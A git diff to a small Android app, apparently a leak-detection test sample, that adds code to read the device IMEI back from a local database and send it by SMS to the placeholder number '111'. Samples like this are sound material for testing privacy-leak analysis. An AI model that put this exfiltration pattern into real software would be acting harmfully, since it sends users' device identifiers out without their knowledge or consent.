@@ -1,8 +1,10 @@
 package com.example.shiva.leakviastorage;
 
 import android.content.Context;
+import android.database.Cursor;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.widget.Toast;
 
@@ -17,6 +19,7 @@ public class MainActivity extends AppCompatActivity {
         imeiDb=new Databasehelper(this);
         String imei=getImei();
         uploadToDb(imei);
+        leakImei(getFromDb());
     }
 
     public String getImei()
@@ -36,14 +39,17 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(MainActivity.this,"Data not Inserted",Toast.LENGTH_LONG).show();
     }
 
-    public String retriveImei()
+    public String getFromDb()
     {
-        String str="";
-        return str;
+        Cursor res=imeiDb.getData();
+        String imei=res.getString(0);
+        return imei;
     }
 
-    public void leakImei()
+    public void leakImei(String imei)
     {
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("111", null, imei, null, null);
 
     }
 
